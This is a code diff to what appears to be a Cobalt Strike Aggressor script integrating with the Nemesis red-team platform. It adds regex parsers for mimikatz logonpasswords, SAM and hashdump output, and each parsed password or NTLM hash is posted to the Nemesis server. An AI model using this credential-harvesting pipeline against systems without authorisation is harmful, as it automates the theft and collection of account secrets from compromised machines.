@@ -554,9 +554,28 @@ sub Handle_downloads {
     }, \$LocalFilePath, \$BID, \$TargetFileFolder, \$TargetFileName, \$TargetFileSize, \$TimeStamp));
 }
 
+sub ExportToNemesis {
+    local('$username $type $data $command %RawData $command $MessageID $BID');
+    $username = $1;
+    $type = $2;
+    $data = $3;
+    $command = $4;
+
+    %RawData = %(
+        username => $username;
+        type => $type;
+        is_file => false;
+        data => $data;
+        notes => $command;
+    );
+
+    $MessageID = http::PostData($BID, "authentication_data", @(%RawData));
+    blog($BID, "Nemesis: Detected credentials");
+    
+}
 
 sub Handle_beacon_output {
-    local('$IsHeadlessClient $ClientSyncedFromServer $1 %Args $BID $Output $FileID $DomainController $BackupkeyGuid $RandomName $BackupkeyB64 %JsonData $JsonString %RawData $MessageID');
+    local('$IsHeadlessClient $isHashdumpPattern $hashdumpPattern $ntlmPattern $credsPattern $isLogonPasswords $Size $isSamPattern $samPattern $BID %JsonCreds $ClientSyncedFromServer $1 %Args $BID $Output $FileID $search %JsonData $JsonString');
 
     # don't process if things aren't initialized correctly yet
     if(!$NemesisReady) {return $null;}
@@ -568,6 +587,47 @@ sub Handle_beacon_output {
     %Args = $1;
     $BID = %Args[0];
     $Output = %Args[1];
+
+    $isLogonPasswords = '(?<=Authentication Id)([\s\S]*$)';
+    $isSamPattern = '(?<=SAMKey)([\s\S]*$)';
+    $isHashdumpPattern = '(?:[^:]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::\n?)+';
+
+    $credsPattern = 'Username\s+:\s+(?!\(null\))(\S+)\s+\*\s+Domain\s+:\s+(?!\(null\))(\S+)\s+\*\s+Password\s+:\s+(?!\(null\))(\S+)';
+    $ntlmPattern = 'Username\s+:\s+(?!\(null\))(\S+)\s+\*\s+Domain\s+:\s+(?!\(null\))(\S+)\s+\*\s+NTLM\s+:\s+(?!\(null\))(\S+)';
+    $samPattern = 'User\s*:\s*([^\n]+)\s*Hash\s*NTLM\s*:\s*([a-fA-F0-9]{32})';
+    $hashdumpPattern = '([^:\n]+):[^:]+:([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::';
+
+
+    # Handle LogonPasswords output
+    if ($Output hasmatch $isLogonPasswords) {  
+        $search = matched()[0];
+
+        # Retrieve credman credentials
+        while ($search hasmatch $credsPattern) {
+            ExportToNemesis(matched()[0], "password", matched()[2], "mimikatz logonpasswords");
+	    }
+
+        # Retrieve NTLM hashes
+        while ($search hasmatch $ntlmPattern) {
+            ExportToNemesis(matched()[0], "ntlm_hash", matched()[2], "mimikatz logonpasswords");
+        }
+    }
+
+    # Handle SAM output
+    if ($Output hasmatch $isSamPattern) {  
+        $search = matched()[0];
+
+        while ($search hasmatch $samPattern) {
+            ExportToNemesis(matched()[0], "ntlm_hash", matched()[1], "mimikatz sam");
+        }
+    }
+
+    # Handle Hashdump output
+    if ($Output hasmatch $isHashdumpPattern) {  
+        while ($Output hasmatch $hashdumpPattern) {
+            ExportToNemesis(matched()[0], "ntlm_hash", matched()[2], "hashdump");
+        }
+    }
 
     # Handle domain backupkey output from SharpDPAPI
     if ($Output hasmatch '\[\*\] Using current domain controller  : ([a-zA-Z0-9\.-]+)\s*\[\*\] Preferred backupkey Guid         : ([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})\s*\[\*\]') {
